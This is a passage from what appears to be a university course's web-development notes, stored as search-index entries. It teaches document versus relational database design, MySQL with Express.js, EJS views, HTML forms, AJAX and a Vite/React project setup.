]\n}\n</code></pre> <p>Approach two: Storing <code>staff</code> as a separate collection from <code>dept</code>. The <code>staff</code> attribute in the <code>dept</code> document should contains only the ids of the staff. A <code>dept</code> document</p> <pre><code>{\n  \"code\": \"HR\",\n  \"staff_ids\": [\n    {\n      \"id\": 1\n    },\n    {\n      \"id\": 2\n    }\n  ]\n}\n</code></pre> <p>A <code>staff</code> document contains <code>id</code>, <code>name</code> and <code>dept_code</code> attributes.</p> <pre><code> {\n   'id': 1,\n   'name': 'aaron'\n   'dept_code': 'HR'\n }\n</code></pre> <p>Both design will work. The advantage of the first approach is that all the information are now stored in one collection, it is easier to ensure the data consistency, while the downside is that as the conceptual model becomes complex, we might have documents with too many level of nesting. Approach two avoids the deep nesting of the document structure, however, to maintain the data consistency requires additional checking and validation in the application.</p>"},{"location":"notes/l2_1_expressjs_backend_mongo/#cohort-exercises","title":"Cohort Exercises","text":"<p>Using MongoDB document example, can you give a logical design of the ER diagram with the <code>Staff</code> and <code>Dept</code> entities and <code>Work</code> and <code>Manage</code> relationships?</p> <p>Can you implement a web app with the correspondent end-point (routes) handlers to support</p> <ol> <li>add and update <code>staff</code></li> <li>add <code>dept</code></li> <li>find <code>staff</code>s by department code</li> <li>find <code>staff</code>s by staff id</li> </ol>"},{"location":"notes/l2_1_expressjs_backend_mongo/#some-special-cases-of-er-diagrams","title":"Some special cases of ER diagrams","text":"<p>There are some difficult cases of ER diagrams to be modeled in document database in general,</p> <p>For instance a ternery relationship below  For simplicity, we omitted the attributes of the entities. In this design find that</p> <ol> <li>Given an article and a book, we find only one publisher</li> <li>Given an article and a publisher, we find only one book,</li> <li>Given a publisher and a book, there are many articles inside.</li> </ol> <p>Another example is the self-loop relationship below</p> <p></p> <ol> <li>A staff can be the Reporting Officer of many other staffs</li> <li>A staff can be the Subordinate of only one managing staff.</li> </ol> <p>Implementing these designs often require us to have flat document structures.</p>"},{"location":"notes/l2_2_mysql/","title":"50.003 - Express.js and MySQL","text":""},{"location":"notes/l2_2_mysql/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Use MySQL to manage a relational database</li> <li>Integrate the restful API with MySQL as the database.</li> <li>Use view to present user requested information</li> </ol>"},{"location":"notes/l2_2_mysql/#relational-databases","title":"Relational Databases","text":"<p>From the previous unit, we learn that Relational Database is an alternative to provide a logical model (and physical model) to a database design. Relational Database, informally speaking, represent data in terms of relations (or tables). A table is a set of records that have the same set of attributes.</p> <p>For instance, given the ER diagram</p> <p></p> <p>We could</p> <ol> <li>represent the <code>staff</code> entity as a table</li> </ol> id name 1 aaron 2 betty <p><code>id</code> is the primary key 2. reprsent the <code>dept</code> entity as a table</p> code HR <p><code>code</code> is the primary key.</p> <ol> <li>represent the <code>Work</code> relationship as a table</li> </ol> id code 1 HR 2 HR <p><code>id</code> and <code>code</code> together form the primary key.</p> <ol> <li>represent the <code>Manage</code> relationship as a table</li> </ol> id code 2 HR <p>either <code>id</code> or <code>code</code> can be the primary key.</p> <p>Sometimes, we just represent the above using a simpler schema representation for documentation purposes.</p> <ul> <li>staff(id, name)</li> <li>dept(code)</li> <li>work(id, code)</li> <li>manage(id, code)</li> </ul> <p>Next let's implement the above logical design using MySQL</p>"},{"location":"notes/l2_2_mysql/#mysql","title":"MySQL","text":"<p>To install MySQL,</p> <ul> <li>If you are using windows or Mac, you can download and install from   <pre><code>https://dev.mysql.com/downloads/mysql/\n</code></pre></li> <li>If you are using Ubuntu or Ubuntu subsystem in Windows   <pre><code>sudo apt install mysql-server\n</code></pre></li> </ul> <p>To create a database in MySQL, we can use the mysql client shell or, if you prefer something with UI, you can install and use MySQL Workbench (graphical tool to work with mysql instead on terminal)</p> <pre><code>sudo mysql\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; create database staffdir;\nQuery OK, 1 row affected (0.04 sec)\n\nmysql&gt; use staffdir;\nDatabase changed\nmysql&gt;\n</code></pre> For Mac users, if `sudo mysql` does not work, try to run these instead <pre><code>echo 'export PATH=/usr/local/mysql/bin:$PATH' &gt;&gt; ~/.bash_profile\n. ~/.bash_profile\nsudo mysql -u root -p\n</code></pre> <p>In the above we login to the <code>mysql</code> client as the root user. In the MySQL Shell, we create a database name <code>staffdir</code>. You can use <code>SHOW DATABASES;</code> command to check if it is created. Some databases are already created when you install mysql. We then use <code>use</code> command to switch the current working database to <code>staffdir</code>.</p>"},{"location":"notes/l2_2_mysql/#data-definition-language","title":"Data Definition Language","text":"<p>As a standard option for SQL compatible database, MySQL offers a subset of the language to enable the user to define the database tables, AKA Data Definition Language.</p> <p>First let's create the <code>staff</code> table and the <code>dept</code> table</p> <pre><code>CREATE TABLE staff(\n    id INTEGER PRIMARY KEY,\n    name VARCHAR(255)\n);\n\nCREATE TABLE dept(\n    code CHAR(2) PRIMARY KEY\n);\n</code></pre> <p>The <code>CREATE TABLE</code> statement specifies the table name (preceding the bracket), and the attributes (inbetween the brackets). We have to define the type of the attribute, <code>INTEGER</code> as integer, <code>VARCHAR(255)</code> as a variable length character array with max length 255. In addition, we specify the primary key using the <code>PRIMARY KEY</code> keyword. <code>PRIMARY KEY</code> and <code>FOREIGN KEY</code> are used to establish a relationship between two tables.</p> <p>Note that SQL statements are case insensitive.</p> <p>Next we consider the tables for the two relationships,</p> <pre><code>CREATE TABLE work(\n    id INTEGER,\n    code CHAR(2),\n    PRIMARY KEY (id, code),\n    FOREIGN KEY (id) REFERENCES staff(id),\n    FOREIGN KEY (code) REFERENCES dept(code)\n);\n\nCREATE TABLE manage(\n    id INTEGER UNIQUE,\n    code CHAR(2) PRIMARY KEY,\n    FOREIGN KEY (id) REFERENCES staff(id),\n    FOREIGN KEY (code) REFERENCES dept(code)\n);\n</code></pre> <p>Since the attributes of the <code>work</code> table (similarly, <code>manage</code>) are dependent on those defined in the entities tables, namely <code>staff</code> and <code>dept</code>. There must be some kind of integrity checking to be done by the database (also called Referential Integrity). The <code>FOREIGN KEY</code> keyword specifies that <code>id</code> in <code>work</code> must be an existing <code>id</code> in <code>staff</code> table. Similar observation applies to the <code>code</code> attribute. The implication of <code>PRIMARY KEY (id, code)</code> is that there must be no rows which have similar <code>id</code> and <code>code</code> in <code>work</code> table.</p> <p>The database will return an error if a record with <code>id</code> not existing in <code>staff</code> being inserted into <code>work</code> or a record with <code>id</code> used <code>work</code> being deleted from <code>staff</code>.</p> <p>To drop a table, we can use a <code>DROP TABLE</code> statement</p> <pre><code>DROP TABLE manage;\n</code></pre> <p>For the full set of DDL operations for MySQL,</p> <pre><code>https://dev.mysql.com/doc/refman/8.0/en/innodb-online-ddl-operations.html\n</code></pre>"},{"location":"notes/l2_2_mysql/#data-manipulation-language","title":"Data Manipulation Language","text":"<p>To insert records into the tables, we use the <code>INSERT</code> statements</p> <pre><code>INSERT INTO staff (id, name) VALUES (1, \"aaron\"), (2, \"betty\");\nINSERT INTO dept (code) VALUES (\"HR\");\nINSERT INTO work (id, code) VALUES (1, \"HR\"), (2, \"HR\");\nINSERT INTO manage (id, code) VALUES (2, \"HR\");\n</code></pre> <p>To retrieve the records from a table, we use the <code>SELECT</code> statement</p> <p>For instance</p> <pre><code>SELECT * FROM work;\n</code></pre> <p>returns the list of records (<code>id</code> and <code>code</code>) in the <code>work</code> table.</p> <p>The query below</p> <pre><code>SELECT id FROM work where code = \"HR\";\n</code></pre> <p>returns the list of staff id from the HR department.</p> <p>The query below</p> <pre><code>-- find all names of staff who are working in the HR department\nSELECT staff.name FROM work INNER JOIN staff ON work.id=staff.id\nWHERE work.code=\"HR\";\n</code></pre> <p>finds the list of staff names from the HR department.</p> <p>We can also perform aggregation.</p> <pre><code>SELECT count(id), code FROM work\nGROUP BY code;\n</code></pre> <p>finds the number of staff for each department. Aggregation operation in SQL generally requires you to define how to do the grouping and what is the function applied. In the example above, we group by <code>code</code> and apply <code>count</code> function.</p> <p>To update a set of records in a table, we use the <code>UPDATE</code> statement.</p> <p>For example the following statement change the name of staff with id = 2 to \"beatrice\".</p> <pre><code>UPDATE staff SET name = \"beatrice\" WHERE id = 2;\n</code></pre> <p>To delete a set of records in a table, we use the <code>DELETE</code> statement.</p> <pre><code>DELETE FROM manage WHERE code = \"HR\";\n</code></pre>"},{"location":"notes/l2_2_mysql/#expressjs-with-mysql","title":"Express.js with MySQL","text":"<p>Let's create a similar project structure</p> <pre><code>mkdir my_mysql_app\ncd my_mysql_app\nnpx express-generator --view=ejs\nnpm i\nnpm i mysql2\n</code></pre> <p>Next login to mysql client shell and create a database and a databse user;</p> <pre><code>CREATE DATABASE echo;\nCREATE USER 'pichu'@'localhost' IDENTIFIED BY 'pikaP!'; -- we may replace % by hostname/ip to restrict the access\nGRANT ALL PRIVILEGES ON echo.* TO 'pichu'@'localhost';\nFLUSH PRIVILEGES;\n</code></pre> <p>You can run <code>SELECT * FROM mysql.user;</code> to check if a new user has been created. The first statement creates a database named <code>echo</code>. The second statement create a database user with name <code>pichu</code> located at the <code>localhost</code> with password as <code>pikaP!</code>. The third statement grants all the privileges on the <code>echo</code> database to this user. The last statement ensure all the privilege updates are written to the disk.</p> <p>Go to the express.js project root folder, namely <code>my_mysql_app</code>, create a sub folder with name <code>models</code>. In folder <code>models</code>, create a <code>db.js</code> file with the following content.</p> <pre><code>const mysql = require(\"mysql2\");\n\nlet pool = mysql\n  .createPool({\n    host: \"localhost\",\n    user: \"pichu\",\n    database: \"echo\",\n    password: \"pikaP!\",\n    connectionLimit: 10,\n  })\n  .promise();\n\nasync function cleanup() {\n  await pool.end();\n}\n\nmodule.exports = { pool, cleanup };\n</code></pre> <p>In the second statement, we create a connection pool to the mysql database. A connection pool allows us to have multiple connections from multiple threads to access the database.</p> <p>The rest are similar to the one we learned using mongodb.</p> <p>Next in the same folder (<code>models</code>), create a file named <code>message.js</code> with the following content.</p> <pre><code>const db = require(\"./db.js\");\n\nconst tableName = \"message\";\n\nclass Message {\n  constructor(msg, time) {\n    this.msg = msg;\n    this.time = time;\n  }\n}\n\nasync function sync() {\n  try {\n    db.pool.query(`\n        CREATE TABLE IF NOT EXISTS ${tableName} (\n            msg VARCHAR(255),\n            time DATETIME PRIMARY KEY\n        )\n        `);\n  } catch (error) {\n    console.error(\"database connection failed. \" + error);\n    throw error;\n  }\n}\n\nasync function all() {\n  try {\n    const [rows, fieldDefs] = await db.pool.query(`\n            SELECT msg, time FROM ${tableName}\n        `);\n    var list = [];\n    for (let row of rows) {\n      let message = new Message(row.msg, row.time);\n      list.push(message);\n    }\n    return list;\n  } catch (error) {\n    console.error(\"database connection failed. \" + error);\n    throw error;\n  }\n}\n\nasync function insertOne(message) {\n  try {\n    const [rows, fieldDefs] = await db.pool.query(\n      `\n            INSERT INTO ${tableName} (msg, time) VALUES (?, ?)\n        `,\n      [message.msg, message.time]\n    );\n  } catch (error) {\n    console.error(\"database connection failed. \" + error);\n    throw error;\n  }\n}\n\nasync function insertMany(messages) {\n  for (let message of messages) {\n    await insertOne(message);\n  }\n}\n\nmodule.exports = { Message, all, sync, insertOne, insertMany };\n</code></pre> <p>Similar to how <code>my_mongo_app</code>, we define a class <code>Message</code> to model each message received and saved. MySQL data must be stored in a table with schema definition. We define a <code>sync</code> function which creates the table in the database if it is not there. This function will be called in the <code>app.js</code> when the web app starts. We provide a set of functions.</p> <ul> <li>Function <code>all</code> retrieves all the messages from the table.</li> <li>Function <code>insertOne</code> inserts a message using the INSERT statement. In this case we find two <code>?</code>s in the statement, these two question marks are the placeholders for the verified values. In this case <code>message.msg</code> and <code>message.time</code> will be subsituted in the statement if they are valid. The <code>mysql2</code> library will verify that the values substituting <code>?</code> do not contain illegal characters which might cause issues.</li> <li>Function <code>insertMany</code> inserts a list of messages.</li> </ul> <p>Next we create a <code>routes/echo.js</code> file with the following content,</p> <pre><code>const express = require(\"express\");\nconst model = require(\"../models/message.js\");\nvar router = express.Router();\n\n/* GET echo listing. */\n\nrouter.get(\"/:msg\", async function (req, res, next) {\n  const msg = req.params.msg;\n  const message = new model.Message(msg, new Date());\n  await model.insertMany([message]);\n  const messages = await model.all();\n  console.log(messages);\n  res.send(`${JSON.stringify(messages)}`);\n});\n\nmodule.exports = router;\n</code></pre> <p>which is similar to what we have seen in the <code>my_mongo_app</code>.</p> <p>Finally, in the <code>app.js</code> file, we include the following</p> <pre><code>var logger = require(\"morgan\");\n// adding the following\nconst db = require(\"./models/db.js\");\nconst process = require(\"process\");\n\nprocess.on(\"SIGINT\", db.cleanup);\nprocess.on(\"SIGTERM\", db.cleanup);\nconst message = require(\"./models/message.js\");\nmessage.sync();\n// end\n</code></pre> <p>We imported the <code>db.js</code> file we created and <code>process</code> library so that we can register the <code>db.cleanup</code> function as the callback when the web app terminates. We also imported the <code>message</code> model module so that we can call <code>message.sync()</code> to make sure the table exists.</p> <p>Finally we add the following to <code>app.js</code> so that we can call the <code>echo</code> router on the URL path <code>/echo</code>.</p> <pre><code>var echoRouter = require(\"./routes/echo\");\napp.use(\"/echo\", echoRouter);\n</code></pre>"},{"location":"notes/l2_2_mysql/#cohort-exercise","title":"Cohort Exercise","text":"<p>Given the ER diagram below,</p> <p></p> <p>give the step-by-step explanation on how we can implement API which returns the count of staff from each department.</p> <p><code>http://127.0.0.1:3000/dept/count</code> which yields</p> <p><code>[{\"count\":2,\"dept\":\"HR\"}]</code>.</p>"},{"location":"notes/l2_2_mysql/#exercise-not-graded","title":"Exercise (Not Graded)","text":"<p>Can you modify the <code>echo</code> router so that it will return the most recent 3 messages?</p> <p>In the above example, we incorporate the model layer to the web app. The models abstract away the underlying database operations in forms of function calls and class object instantiation.</p> <p>Alternatively, we could use the <code>sequelize</code> library to help us to generate some of these codes. You are encouraged to check out the <code>sequelize</code> library.</p> <pre><code>https://sequelize.org/\n</code></pre>"},{"location":"notes/l3_1_expressjs_frontend/","title":"50.003 - Express.js Frontend: View, HTML Form, and AJAX","text":""},{"location":"notes/l3_1_expressjs_frontend/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Use view to present user requested information</li> <li>Develop web app frontend using HTML Form</li> <li>Develop web app frontend using AJAX</li> </ol> <p>In this unit, we study the different approaches of developing frontend components of a web application.</p> <p>Recall that the View modules in a MVC model are dedicated to handle user inputs and renders the requested results.</p>"},{"location":"notes/l3_1_expressjs_frontend/#view","title":"View","text":"<p>Let's take our echo app as example, when we visit</p> <pre><code>https://localhost:3000/\n</code></pre> <p>The web app is triggering the following route in the <code>routes/index.js</code>.</p> <pre><code>/* GET home page. */\nrouter.get(\"/\", function (req, res, next) {\n  res.render(\"index\", { title: \"Express\" });\n});\n</code></pre> <p>In the above we call <code>res.render()</code> which takes two parameters.</p> <ol> <li><code>index</code>, the view template, (<code>./views/index.ejs</code>).</li> <li>An object <code>{ title: 'Express'}</code>.    it passes the object to the view template</li> </ol> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"/stylesheets/style.css\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;\n    &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Note that in the view template, we are using mostly HTML syntax, except that we have some special tagged element <code>&lt;%= title %&gt;</code> which are the place-holders for the data to displayed. When <code>res.render()</code> is called with the view template and the object, the value associated with <code>title</code>, i.e. <code>Express</code> is being substituted to the tagged elements.</p> <p>As result, the following will be rendered on the client browser,</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Express&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"/stylesheets/style.css\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Express&lt;/h1&gt;\n    &lt;p&gt;Welcome to Express&lt;/p&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"notes/l3_1_expressjs_frontend/#adding-view-to-the-echo-app","title":"Adding View to the Echo App","text":"<p>Let's create a template in <code>views/</code> named <code>echo.ejs</code>, with the following</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"/stylesheets/style.css\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div&gt;Enter Your Message:&lt;/div&gt;\n    &lt;div&gt;&lt;input id=\"message\" type=\"text\" /&gt;&lt;/div&gt;\n    &lt;div&gt;&lt;input id=\"sendButton\" type=\"button\" value=\"Send\" /&gt;&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Next we modify the <code>routes/echo.js</code> by inserting the following code snippet before the export statement.</p> <pre><code>router.get(\"/\", function (req, res, next) {\n  res.render(`echo`, { title: \"Echo App\" });\n});\n</code></pre> <p>Now if we launch our web app, and open the link</p> <pre><code>http://localhost:3000/echo/\n</code></pre> <p>we should see a page with a text label, a text field input and a button. But clicking on the button renders no effect.</p> <p>There are at least two ways to add the effect of clicking the <code>Send</code> button and sending the message to the database.</p>"},{"location":"notes/l3_1_expressjs_frontend/#approach-1-using-html-form","title":"Approach 1: using HTML form","text":"<p>For now let's go with the approach which involves an HTML form</p> <p>Duplicate the template <code>echo.ejs</code> into another file <code>echoform.ejs</code>, with the following adjustment</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"/stylesheets/style.css\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;form action=\"/echo/submit\" method=\"post\"&gt;\n      &lt;div&gt;Enter Your Message:&lt;/div&gt;\n      &lt;div&gt;&lt;input id=\"message\" name=\"message\" type=\"text\" /&gt;&lt;/div&gt;\n      &lt;div&gt;&lt;input type=\"submit\" value=\"Send\" /&gt;&lt;/div&gt;\n    &lt;/form&gt;\n    &lt;ol&gt;\n      &lt;% for (var i = 0; i &lt; messages.length; i++) { %&gt;\n      &lt;li&gt;\n        &lt;div&gt;Time created: &lt;%=messages[i].time%&gt;&lt;/div&gt;\n        &lt;div&gt;Message: &lt;%=messages[i].msg%&gt;&lt;/div&gt;\n        &lt;br /&gt;\n      &lt;/li&gt;\n      &lt;% } %&gt;\n    &lt;/ol&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>An HTML form captures the inputs, where the values are stored in request object body if the method is <code>post</code>. For the submit button, we can use <code>submit</code> type. The <code>action</code> attribute of the form element indicates the destination of the end point. Below the form, we have an HTML order list element <code>ol</code>, whose content will be generated via the embedded javscript template language. In this case, we expect that the route handler will return a list of objects containing <code>title</code> and <code>messages</code> attributes. By using a for loop, we expand the list of messages into a sequence of list items <code>li</code>. Within each <code>li</code> element, we render the message's time and text.</p> <p>Next we update the <code>routes/echo.js</code> as follows</p> <pre><code>const express = require(\"express\"); // existing\nconst model = require(\"../models/message.js\"); // existing\nvar router = express.Router(); // existing\n\n/* GET echo listing. */\nrouter.get(\"/:msg\", async function (req, res, next) {\n  // existing\n  const msg = req.params.msg;\n  const message = new model.Message(msg, new Date());\n  await model.insertMany([message]);\n  const messages = await model.all();\n  console.log(messages);\n  res.send(`${JSON.stringify(messages)}`);\n});\n\nrouter.get(\"/\", async function (req, res, next) {\n  // updated\n  const messages = await model.all();\n  res.render(`echoform`, { title: \"Echo App\", messages: messages });\n});\n\nrouter.post(\"/submit\", async function (req, res, next) {\n  // new\n  const msg = req.body.message;\n  const message = new model.Message(msg, new Date());\n  await model.insertMany([message]);\n  res.redirect(\"/echo\");\n});\n\nmodule.exports = router; // existing\n</code></pre> <p>In the second routing rule, we listen to the local URL path <code>/echo/</code>, and retrieve all the messages, and render the result in the <code>echoform</code> template. This is to handle user accessing</p> <pre><code>http://localhost:3000/echo\n</code></pre> <p>In the third routing rule, we retrieve the message (via element name attribute = \"message\"), create a new message, and redirect page back to <code>http://localhost:3000/echo</code>. .</p> <p>Being different from HTTP GET, parameters of the requests submited via HTTP POST are packaged into the body of the request instead of being exposed as part of the URL. Technically speaking, users can't access a HTTP POST endpoint directly via the browser URL links or navigation bar.</p> <p>To allow the form data embeded in the HTTP POST request to be parsed, we add the following to the <code>app.js</code></p> <pre><code>const bodyParser = require(\"body-parser\"); // new\napp.use(bodyParser.urlencoded({ extended: true })); // new\n\napp.use(\"/\", indexRouter); // existing\napp.use(\"/users\", usersRouter); // existing\n</code></pre> <p></p>"},{"location":"notes/l3_1_expressjs_frontend/#approach-2-using-ajax","title":"Approach 2 Using AJAX","text":"<p>The advantage of Approach 1 is that it is relatively simple to implement and codes are pretty structured. One issue with Approach 1 is that the page <code>echoform</code> is reloaded each time we submit a new message. This is not a big deal when the page is simple with little content. It affects the user experience as the content of the page get complex and a single click would cause the entire page to refresh.</p> <p>To address this issue, we could use AJAX (A).</p> <p>AJAX stands for Asynchronous Javascript and XML. It is not a programming language, library, or a framework, but rather a technique that uses a combination of technologies to :</p> <ol> <li>Perform asynchronous communication with server</li> <li>Update a portion of page (HTML element) so the webapp is more responsive    In other words, AJAX is a term to describe the usage of Javascript+HTML DOM to display data, and XMLHttpRequest to request data from a server.</li> </ol> <p>The idea of AJAX is to divide the view template HTML into sub regions. When a user input is detected, we use the client side javascript to update the affected sub region.</p> <p>We re-start from the point of <code>echo.ejs</code> template again. We copy and modify its content into a new template <code>echoajax.ejs</code></p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt;\n    &lt;script src=\"/javascripts/echoajaxclient.js\"&gt;&lt;/script&gt;\n    &lt;link rel=\"stylesheet\" href=\"/stylesheets/style.css\" /&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div&gt;Enter Your Message:&lt;/div&gt;\n    &lt;div&gt;&lt;input id=\"message\" type=\"text\" /&gt;&lt;/div&gt;\n    &lt;div&gt;&lt;input id=\"sendButton\" type=\"button\" value=\"Send\" /&gt;&lt;/div&gt;\n\n    &lt;ol id=\"messagesregion\"&gt;&lt;/ol&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Note that only change we introduce is the <code>div</code> element with id <code>messagesregion</code> and the inclusion of the client side javascript <code>echoajaxclient</code>.</p> <p>Next we add <code>echoajaxclient.js</code> file into the subfolder <code>public/javascripts/</code>.</p> <pre><code>// update the ol with id  = \"messagesregion\" in the curent page\n// input: json contains list of messages\n// output : none\nfunction update_messagesregion(json) {\n  var html = \"\";\n  for (let i = 0; i &lt; json.length; i++) {\n    const message = json[i];\n    html += `&lt;li&gt;&lt;div&gt;${message.time}&lt;/div&gt;&lt;div&gt;${message.msg}&lt;/div&gt;&lt;/li&gt;`;\n  }\n  var region = document.getElementById(\"messagesregion\");\n  region.innerHTML = html;\n}\n\nfunction handleSendButtonClick() {\n  var message = document.getElementById(\"message\");\n  var xhr = new XMLHttpRequest();\n  xhr.onreadystatechange = function () {\n    if (xhr.readyState == 4) {\n      var res = xhr.responseText;\n      var json = JSON.parse(res);\n      update_messagesregion(json);\n    }\n  };\n\n  // constructing a HTTP POST request\n  var params = `msg=${message.value}`;\n  xhr.open(\"POST\", `/echo/submit/`, true);\n  //Send the proper header information along with the request\n  xhr.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n  xhr.send(params);\n}\n\n// set up the event listener for the send button\n// call /echo/all to get the current list of messages\nfunction run() {\n  var sendButton = document.getElementById(\"sendButton\");\n  sendButton.addEventListener(\"click\", handleSendButtonClick);\n  var xhr = new XMLHttpRequest();\n\n  xhr.onreadystatechange = function () {\n    if (xhr.readyState == 4) {\n      var res = xhr.responseText;\n      var json = JSON.parse(res);\n      update_messagesregion(json);\n    }\n  };\n  xhr.open(\"GET\", `/echo/all`);\n  xhr.send();\n}\n\ndocument.addEventListener(\"DOMContentLoaded\", run);\n</code></pre> <p>In the above client side javascript, we call function <code>run</code> when the HTML document is fully rendered. Function <code>run</code> performs two tasks</p> <ol> <li>register a call back function <code>handleSendButtonClick</code> to the event of <code>sendButton</code> being click.</li> <li>make an API call to the <code>/echo/all</code> end point to get the list of messages and render it in the <code>messagesregion</code> ordered list.</li> </ol> <p>Function <code>handleSendButtonClick</code> is triggered when the button is clicked, it retrieves the value from the input text box and submit an HTTP POST request to the <code>/echo/submit</code> end point to add the message, then extract the list of messages from the response and render it.</p> <p>We adjust the <code>routes/echo.js</code> with the following routing rules.</p> <pre><code>router.get(\"/\", async function (req, res, next) {\n  res.render(`echoajax`, { title: \"Echo App\" });\n});\n\nrouter.get(\"/all\", async function (req, res, next) {\n  const messages = await model.all();\n  res.send(`${JSON.stringify(messages)}`);\n});\n\nrouter.post(\"/submit/\", async function (req, res, next) {\n  const msg = req.body.msg;\n  const message = new model.Message(msg, new Date());\n  await model.insertMany([message]);\n  const messages = await model.all();\n  res.send(`${JSON.stringify(messages)}`);\n});\n</code></pre>"},{"location":"notes/l3_2_react/","title":"50.003 - Frontend Development using React.js","text":""},{"location":"notes/l3_2_react/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Explain React Components</li> <li>Explain React States</li> <li>Explain React Lifecycle</li> <li>Explain React Effect</li> <li>Develop a frontend app using React JS</li> </ol>"},{"location":"notes/l3_2_react/#issues-with-the-expressjs-ajax-approach","title":"Issues with the ExpressJS + AJAX approach","text":"<ol> <li>routes / controllers for view rendering and AJAX calls are intertwined</li> <li>client side JS in the views are not so reusable and not so testable</li> </ol>"},{"location":"notes/l3_2_react/#front-end-web-app","title":"Front End Web App","text":"<p>A front end web app detachs the view components from a monolith web app. For example, the following diagram shows that a <code>react.js</code> app runs separately from the <code>express.js</code> web app.</p> <p></p> <p>In this settings, the <code>express.js</code> becomes a backend API server. The views are now hosted in the <code>react.js</code> app in a separate host address and port. When the client first accesses a page, it visits the <code>react.js</code> app for the desired web page. The <code>React.js</code> app renders the web page by making an API call to the backend server. When it has the JSON data, it inserts the data into the result rendered. In addition, it bundles all the client side JS codes and other static content and sends them to the client browser as the response.</p> <p>The bundle JS codes becomes the client app which runs in the client browser. In the subsequent requests (initiated by UI control), the AJAX calls are made directly from the client browser through the client app. This frees up some of the processing time from the web server as more codes are executed within the client browser. </p> <p>Furthermore, the client side JS codes are hosted and executed (at least during the first request) on the <code>react.js</code> app server. This allows JS codes to be better modularized as a separate project, thus testing can be conducted systematically.</p>"},{"location":"notes/l3_2_react/#building-a-reactjs-app","title":"Building a ReactJS App","text":"<p>To initiate the project, we need to execute</p> <pre><code>npm create vite@latest my_react_app -- --template react\ncd my_react_app\n</code></pre> <p>We find a project folder with the following content.</p> <pre><code>.\n\u251c\u2500\u2500 public\n\u2502   \u2514\u2500\u2500 vite.svg\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 assets\n\u2502   \u2502   \u2514\u2500\u2500 react.svg\n\u2502   \u251c\u2500\u2500 App.css\n\u2502   \u251c\u2500\u2500 App.jsx\n\u2502   \u251c\u2500\u2500 index.css\n\u2502   \u2514\u2500\u2500 main.jsx\n\u251c\u2500\u2500 eslint.config.js\n\u251c\u2500\u2500 index.html\n\u251c\u2500\u2500 package.json\n\u2514\u2500\u2500 vite.config.js\n</code></pre> <p><code>src/main.jsx</code> is the main function (application entry point).</p> <pre><code>import { StrictMode } from 'react'\nimport { createRoot } from 'react-dom/client'\nimport './index.css'\nimport App from './App.jsx'\n\ncreateRoot(document.getElementById('root')).render(\n  &lt;StrictMode&gt;\n    &lt;App /&gt;\n  &lt;/StrictMode&gt;,\n)\n</code></pre> <p>From the above we noted a few points,</p> <ol> <li>We are using ES6 syntax</li> <li>We mix JavaScript syntax with HTML (XHTML) syntax (as well as CSS). The syntax is called JSX. Using JSX is not mandatory but it is recommended. You can still use pure JS and React syntax to create browser components.</li> <li><code>main.jsx</code> is creating a page by referencing to the <code>root</code> element and render the <code>App</code> element inside.</li> <li>the <code>App</code> element is imported from <code>src/App.jsx</code>.</li> </ol> <p>Let's take a look at the <code>App.jsx</code></p> <pre><code>import { useState } from 'react'\nimport reactLogo from './assets/react.svg'\nimport viteLogo from '/vite.svg'\nimport './App.css'\n\nfunction App() {\n  const [count, setCount] = useState(0)\n\n  return (\n    &lt;&gt;\n      &lt;div&gt;\n        &lt;a href=\"https://vite.dev\" target=\"_blank\"&gt;\n          &lt;img src={viteLogo} className=\"logo\" alt=\"Vite logo\" /&gt;\n        &lt;/a&gt;\n        &lt;a href=\"https://react.dev\" target=\"_blank\"&gt;\n          &lt;img src={reactLogo} className=\"logo react\" alt=\"React logo\" /&gt;\n        &lt;/a&gt;\n      &lt;/div&gt;\n      &lt;h1&gt;Vite + React&lt;/h1&gt;\n      &lt;div className=\"card\"&gt;\n        &lt;button onClick={() =&gt; setCount((count) =&gt; count + 1)}&gt;\n          count is {count}\n        &lt;/button&gt;\n        &lt;p&gt;\n          Edit &lt;code&gt;src/App.jsx&lt;/code&gt; and save to test HMR\n        &lt;/p&gt;\n      &lt;/div&gt;\n      &lt;p className=\"read-the-docs\"&gt;\n        Click on the Vite and React logos to learn more\n      &lt;/p&gt;\n    &lt;/&gt;\n  )\n}\n\nexport default App\n</code></pre> <p>To run the app, we run</p> <pre><code>npm install\nnpm run dev\n</code></pre> <p>which will start the reach app at <code>https://localhost:5173</code>. To stop it, we press control-C in the terminal.</p> <p>As we are going to run both react 